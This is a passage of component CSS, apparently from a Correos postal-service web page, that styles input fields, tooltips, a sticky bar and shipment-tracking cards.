			[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--_ui-input-bg-light-color)
			}

			[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
				border-bottom-color: var(--_ui-input-bg-light-color)
			}

			[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
				background-color: var(--_ui-input-bg-light-color)
			}

			[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--_ui-input-bg-light-color)
			}

			.sc-correos-ui-input-h .error-line.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				border-bottom: 2px solid var(--_ui-input-error-color) !important
			}

			[variant=mini].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input {
				width: 50px;
				cursor: pointer
			}

			[variant=mini].sc-correos-ui-input-h .mdc-text-field__icon.sc-correos-ui-input {
				cursor: pointer
			}

			[variant=mini].sc-correos-ui-input-h .mdc-text-field__icon.sc-correos-ui-input svg.sc-correos-ui-input {
				cursor: pointer
			}

			.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
				color: var(--_ui-input-field-color)
			}

			.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error) .mdc-text-field__icon.sc-correos-ui-input .trailing-icon.sc-correos-ui-input {
				fill: var(--ui-input-label-color)
			}

			.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: var(--ui-input-label-color)
			}

			.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--ui-input-label-color)
			}
		</style>
		<style>
			.sc-correos-ui-tooltip-h {
				--_ui-tooltip-bg-color: var(--ui-tooltip-bg-color, #002E6D);
				--_ui-tooltip-text-color: var(--ui-tooltip-text-color, #FFFFFF);
				--_ui-tooltip-list-item-color: var(--ui-tooltip-list-item-color, #FFFFFF);
				--_ui-tooltip-border-color: var(--ui-tooltip-border-color, #FFFFFF)
			}

			.sc-correos-ui-tooltip-h {
				display: block
			}

			.sc-correos-ui-tooltip-h .ui-container.sc-correos-ui-tooltip {
				position: relative;
				display: inline-block
			}

			.sc-correos-ui-tooltip-h .ui-button.sc-correos-ui-tooltip {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				position: relative
			}
				.sc-correos-ui-sticky-bar-h .ui-body.sc-correos-ui-sticky-bar {
						    position: fixed;
						    width: 100%;
						    background-color: #f8d037;
						    bottom: 0;
						    left: 0;
						    z-index: 16;
						    padding: 16px;
						    display: -ms-flexbox;
						    display: flex;
						    -ms-flex-pack: justify;
						    justify-content: space-between;
						    -ms-flex-align: center;
						    align-items: center;
					}

					@media (min-width: 1024px) {
						.sc-correos-ui-sticky-bar-h .ui-body.sc-correos-ui-sticky-bar {
							bottom: auto
						}
					}

					.sc-correos-ui-sticky-bar-h .ui-body.sc-correos-ui-sticky-bar .ui-main-content.sc-correos-ui-sticky-bar {
						display: -ms-flexbox;
						display: flex;
						-ms-flex-direction: column;
						flex-direction: column;
						margin-right: 16px
					}

			.sc-correos-ui-tooltip-h .ui-button.sc-correos-ui-tooltip::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			.sc-correos-ui-tooltip-h .ui-button.full-height.sc-correos-ui-tooltip {
				height: 100%
			}

			.sc-correos-ui-tooltip-h .ui-button.sc-correos-ui-tooltip:focus {
				outline: none
			}

			.sc-correos-ui-tooltip-h .ui-tooltip-button.sc-correos-ui-tooltip {
				text-decoration: none;
				border: none;
				background: transparent;
				font-family: var(--theme-fontFamily-main)
			}

			.sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip {
				background-color: var(--_ui-tooltip-bg-color);
				padding: 8px;
				border-radius: 8px;
				position: absolute;
				display: none;
				max-width: min(50vw, 304px);
				width: -webkit-max-content;
				width: -moz-max-content;
				width: max-content;
				word-break: break-word;
				z-index: 5
			}

			.sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip {
				display: block
			}

			.sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after {
				top: -18px;
				border: solid transparent;
				left: 0;
				-webkit-transform: translate(50%, 50%);
				transform: translate(50%, 50%);
				content: " ";
				height: 0;
				width: 0;
				position: absolute;
				pointer-events: none;
				border-color: rgba(136, 183, 213, 0);
				border-bottom-color: var(--_ui-tooltip-bg-color);
				border-width: 6px
			}

			.sc-correos-ui-tooltip-h .ui-container-hidden.active.top.sc-correos-ui-tooltip {
				top: -8px;
				-webkit-transform: translateY(-100%);
				transform: translateY(-100%)
			}

			.sc-correos-ui-tooltip-h .ui-container-hidden.active.top.sc-correos-ui-tooltip:after {
				bottom: 0;
				top: auto;
				left: 8px;
				-webkit-transform: translateY(100%);
				transform: translateY(100%);
				border-top-color: var(--_ui-tooltip-bg-color);
				border-bottom-color: transparent
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip:after {
					left: 58%
				}
			}

			[variant=open-left].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip {
				right: 0
			}

			[variant=open-left].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip:after {
				left: calc(100% - 24px)
			}

			[variant=open-left].sc-correos-ui-tooltip-h .ui-container-hidden.top.sc-correos-ui-tooltip {
				top: -8px;
				-webkit-transform: translateY(-100%);
				transform: translateY(-100%)
			}

			[variant=open-left].sc-correos-ui-tooltip-h .ui-container-hidden.top.sc-correos-ui-tooltip:after {
				left: calc(100% - 19px)
			}

			[position-absolute=true].sc-correos-ui-tooltip-h .ui-container.sc-correos-ui-tooltip {
				display: block
			}

			[position-absolute=true].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip {
				position: static
			}

			[position-absolute=true].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after {
				right: -7px;
				left: auto;
				top: 50%;
				border-left-color: var(--_ui-tooltip-bg-color);
				border-bottom-color: transparent;
				-webkit-transform: translate(50%, -50%);
				transform: translate(50%, -50%);
				border-width: 8px
			}

			.sc-correos-ui-tooltip-h[variant=whiteText] .sc-correos-ui-tooltip-s>[slot=textTooltip] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				display: block;
				font-size: 0.75rem;
				line-height: 1.175rem;
				color: var(--_ui-tooltip-text-color)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tooltip-h[variant=whiteText] .sc-correos-ui-tooltip-s>[slot=textTooltip] {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-ui-tooltip-h .sc-correos-ui-tooltip-s>[slot=iconTooltip] {
				color: var(--_ui-tooltip-bg-color)
			}

			[iscontained=within-text].sc-correos-ui-tooltip-h {
				display: initial
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip {
				background-color: var(--_ui-tooltip-text-color);
				border: 1px solid var(--_ui-tooltip-border-color);
				padding: 0;
				right: 0;
				top: 30px;
				left: unset;
				max-width: 192px;
				min-width: 192px;
				z-index: 2
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip {
				display: block
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after {
				content: " ";
				top: -16px;
				border: solid transparent;
				right: 3px;
				left: unset;
				-webkit-transform: rotate(0);
				transform: rotate(0);
				height: 1px;
				width: 3px;
				position: absolute;
				pointer-events: none;
				border-color: rgba(136, 183, 213, 0);
				border-bottom-color: white;
				border-width: 8px
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:before,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:before {
				top: -16px;
				border: solid transparent;
				right: 3px;
				left: unset;
				-webkit-transform: rotate(0);
				transform: rotate(0);
				content: " ";
				height: 0;
				width: 3px;
				position: absolute;
				pointer-events: none;
				border-color: rgba(86, 245, 149, 0);
				border-bottom-color: var(--_ui-tooltip-border-color);
				border-width: 8px
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.top.sc-correos-ui-tooltip,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.top.sc-correos-ui-tooltip {
				top: -8px;
				-webkit-transform: translateY(-100%);
				transform: translateY(-100%)
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.top.sc-correos-ui-tooltip:after,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.top.sc-correos-ui-tooltip:after {
				bottom: 0;
				top: auto;
				right: 0;
				-webkit-transform: translateY(100%);
				transform: translateY(100%);
				border-top-color: var(--_ui-tooltip-bg-color);
				border-bottom-color: transparent
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip {
				top: -100px
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip:after,
			[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip:before,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip:after,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip:before {
				top: 65%;
				right: -18px
			}

			@media (max-width: 639px) {

				[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip,
				[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip {
					right: 56px;
					top: 0;
					min-width: auto
				}

				[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip,
				[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip {
					display: block
				}

				[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after,
				[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after {
					content: " ";
					top: 2px;
					right: -15px;
					-webkit-transform: rotate(90deg);
					transform: rotate(90deg)
				}

				[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:before,
				[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:before {
					content: " ";
					top: 2px;
					right: -15px;
					-webkit-transform: rotate(90deg);
					transform: rotate(90deg)
				}
			}

			@media (min-width: 1024px) {

				[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip,
				[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip {
					right: 85px;
					top: 0;
					min-width: auto
				}

				[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after,
				[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:after {
					content: " ";
					top: 2px;
					right: -15px;
					-webkit-transform: rotate(90deg);
					transform: rotate(90deg)
				}

				[variant=with-list].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:before,
				[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.sc-correos-ui-tooltip:before {
					content: " ";
					top: 2px;
					right: -15px;
					-webkit-transform: rotate(90deg);
					transform: rotate(90deg)
				}
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip,
			[variant=table].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip {
				list-style: none;
				padding: 0;
				margin: 0
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:first-child,
			[variant=table].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:first-child {
				border-radius: 8px
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:last-child,
			[variant=table].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:last-child {
				border-radius: 8px
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:nth-child(2n),
			[variant=table].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:nth-child(2n) {
				background-color: var(--_ui-tooltip-list-item-color)
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:nth-child(2n+1),
			[variant=table].sc-correos-ui-tooltip-h .ui-list.sc-correos-ui-tooltip li.sc-correos-ui-tooltip:nth-child(2n+1) {
				background-color: var(--theme-color-white-plain)
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-list-item.sc-correos-ui-tooltip,
			[variant=table].sc-correos-ui-tooltip-h .ui-list-item.sc-correos-ui-tooltip {
				padding: 16px
			}

			[variant=with-list].sc-correos-ui-tooltip-h .ui-list-link.sc-correos-ui-tooltip,
			[variant=table].sc-correos-ui-tooltip-h .ui-list-link.sc-correos-ui-tooltip {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: initial;
				text-decoration: none;
				font-size: 0.875rem;
				line-height: 1.375rem;
				cursor: pointer;
				color: var(--_ui-tooltip-bg-color);
				display: block;
				width: 100%
			}

			@media (min-width: 1024px) {

				[variant=with-list].sc-correos-ui-tooltip-h .ui-list-link.sc-correos-ui-tooltip,
				[variant=table].sc-correos-ui-tooltip-h .ui-list-link.sc-correos-ui-tooltip {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip {
				top: 0px
			}

			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip:after,
			[variant=table].sc-correos-ui-tooltip-h .ui-container-hidden.active.change-top.sc-correos-ui-tooltip:before {
				top: 2px;
				right: -15px
			}

			[variant=input-password].sc-correos-ui-tooltip-h .ui-container-hidden.sc-correos-ui-tooltip {
				z-index: 2
			}

			.sc-correos-ui-tooltip-h[variant=input-password] .sc-correos-ui-tooltip-s>[slot=textTooltip] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				display: block;
				font-size: 0.75rem;
				line-height: 1.175rem;
				color: var(--_ui-tooltip-text-color)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tooltip-h[variant=input-password] .sc-correos-ui-tooltip-s>[slot=textTooltip] {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}
		</style>
		<style>
			.sc-correos-cdk-shipping-card-h {
				--_cdk-shipping-card-font-family: var(--cdk-shipping-card-font-family, "Courier New");
				--_cdk-shipping-card-bg-color: var(--cdk-shipping-card-bg-color, #ffffff);
				--_cdk-shipping-card-menu-bg-color: var(--cdk-shipping-card-menu-bg-color, #F9F8F8);
				--_cdk-shipping-card-border-color: var(--cdk-shipping-card-border-color, #CBCBCB);
				--_cdk-shipping-card-border-radius: var(--cdk-shipping-card-border-radius, 8px);
				--_cdk-shipping-card-box-shadow: var(--cdk-shipping-card-box-shadow, 0 10px 20px 0 rgba(0, 0, 0, 0.1));
				--_cdk-shipping-card-header-border-bottom: var(--cdk-shipping-card-header-border-bottom, #949494);
				--_cdk-shipping-card-header-color-text-id: var(--cdk-shipping-card-header-color-text-id, #333333);
				--_cdk-shipping-card-header-color-text-company: var(--cdk-shipping-card-header-color-text-company, #949494);
				--_cdk-shipping-card-header-color-text-manage: var(--cdk-shipping-card-header-color-text-manage, #002453);
				--_cdk-shipping-card-container-color-text-title: var(--cdk-shipping-card-container-color-text-title, #333333);
				--_cdk-shipping-card-container-color-text-value: var(--cdk-shipping-card-container-color-text-value, #333333);
				--_cdk-shipping-card-container-color-text-packages: var(--cdk-shipping-card-container-color-text-packages, #333333);
				--_cdk-shipping-card-container-color-icon: var(--cdk-shipping-card-container-color-icon, #002E6D)
			}

			.sc-correos-cdk-shipping-card-h {
				display: block
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-content.sc-correos-cdk-shipping-card {
				font-family: var(--_cdk-shipping-card-font-family);
				border-radius: var(--_cdk-shipping-card-border-radius);
				-webkit-box-shadow: var(--_cdk-shipping-card-box-shadow);
				box-shadow: var(--_cdk-shipping-card-box-shadow);
				background-color: var(--_cdk-shipping-card-bg-color);
				border: solid 1px var(--_cdk-shipping-card-border-color)
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-content--margin.sc-correos-cdk-shipping-card {
				margin-bottom: 24px
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-content--hideBorder.sc-correos-cdk-shipping-card {
				-webkit-box-shadow: none;
				box-shadow: none;
				border: 0px
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package.sc-correos-cdk-shipping-card {
				margin-bottom: 24px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__expedition.sc-correos-cdk-shipping-card {
				font-size: 24px;
				line-height: 28px;
				font-weight: 300;
				color: var(--cdk-shipping-card-container-color-text-title)
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__expedition--bold.sc-correos-cdk-shipping-card {
				font-weight: bold
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__txt.sc-correos-cdk-shipping-card {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				font-weight: 300
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__txt.sc-correos-cdk-shipping-card {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header.sc-correos-cdk-shipping-card {
				display: -ms-flexbox;
				display: flex;
				border-bottom: solid 1px var(--_cdk-shipping-card-header-border-bottom);
				-ms-flex-pack: justify;
				justify-content: space-between;
				padding: 16px 20px;
				-ms-flex-align: center;
				align-items: center;
				font-size: 0;
				position: relative
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header.sc-correos-cdk-shipping-card {
					padding: 25px 27px;
					padding-left: 29px
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number.sc-correos-cdk-shipping-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number--icon.sc-correos-cdk-shipping-card {
				font-size: 18px;
				width: 18px;
				margin-right: 16px;
				color: var(--_cdk-shipping-card-container-color-icon)
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number--icon.sc-correos-cdk-shipping-card {
					margin-right: 20px;
					font-size: 24px;
					width: 24px
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number--icon.sc-correos-cdk-shipping-card:hover {
				cursor: pointer
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number--icon.sc-correos-cdk-shipping-card:focus {
				outline: none;
				outline-width: 0
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number--icon.focus-visible.sc-correos-cdk-shipping-card {
				outline: 2px solid black
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number_block.sc-correos-cdk-shipping-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number_block--id.sc-correos-cdk-shipping-card {
				font-size: 1rem;
				line-height: 1.5rem;
				text-transform: uppercase;
				color: var(--_cdk-shipping-card-header-color-text-id);
				font-weight: bold
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number_block--id.sc-correos-cdk-shipping-card {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number_block--button.sc-correos-cdk-shipping-card {
				margin-top: 11px
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number_block--button.--d-none.sc-correos-cdk-shipping-card {
				display: none
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__manage.sc-correos-cdk-shipping-card {
				font-size: 1rem;
				font-weight: bold;
				color: var(--_cdk-shipping-card-header-color-text-manage)
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__manage.sc-correos-cdk-shipping-card:hover {
				cursor: pointer
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__manage.sc-correos-cdk-shipping-card:focus {
				outline: none;
				outline-width: 0
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container.sc-correos-cdk-shipping-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between;
				-ms-flex-align: center;
				align-items: center;
				padding: 24px;
				padding-bottom: 30px;
				padding-right: 36px;
				font-size: 0
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container--wrap.sc-correos-cdk-shipping-card {
				-ms-flex-wrap: wrap;
				flex-wrap: wrap;
				position: relative
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__steeper.sc-correos-cdk-shipping-card {
				-ms-flex: 0 1 60%;
				flex: 0 1 60%;
				padding-right: 0
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__steeper--md.sc-correos-cdk-shipping-card {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				padding-right: 0
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package.sc-correos-cdk-shipping-card {
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between;
				padding-top: 15px
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card {
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
				width: 100%
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card:before {
				content: none
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card {
					-ms-flex-pack: end;
					justify-content: flex-end
				}

				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
					width: 50%
				}

				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card:before {
					content: "";
					position: absolute;
					left: 0;
					top: 0;
					width: 1px;
					height: 48px;
					background-color: var(--_cdk-shipping-card-border-color)
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--without-date.sc-correos-cdk-shipping-card {
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--without-date.sc-correos-cdk-shipping-card {
					-ms-flex-pack: justify;
					justify-content: space-between
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package.sc-correos-cdk-shipping-card {
					-ms-flex: 0 1 40%;
					flex: 0 1 40%;
					padding-top: 0
				}

				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card {
					-ms-flex: 0 1 664px;
					flex: 0 1 664px;
					margin-left: 184px;
					padding-top: 24px
				}

				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card {
					-ms-flex: 0 1 40%;
					flex: 0 1 40%
				}

				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card,
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
					-ms-flex: 0 1 30%;
					flex: 0 1 30%
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-value.sc-correos-cdk-shipping-card {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				font-size: 0.875rem;
				line-height: 1.375rem;
				color: var(--_cdk-shipping-card-container-color-icon);
				font-weight: bold;
				text-decoration: none
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-value.sc-correos-cdk-shipping-card::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-value.sc-correos-cdk-shipping-card {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-value.sc-correos-cdk-shipping-card:hover,
			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-value.sc-correos-cdk-shipping-card:focus {
				text-decoration: underline
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card {
				width: 50%;
				display: inline-block;
				vertical-align: middle;
				position: relative;
				padding-left: 0
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card {
					padding-left: 10px;
					width: 50%;
					margin-left: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card {
					padding-left: 23px;
					margin-left: 1rem;
					width: calc(50% - 1rem)
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card:before {
				content: "";
				position: absolute;
				left: 0;
				top: 0;
				width: 1px;
				height: 48px;
				background-color: var(--_cdk-shipping-card-border-color)
			}

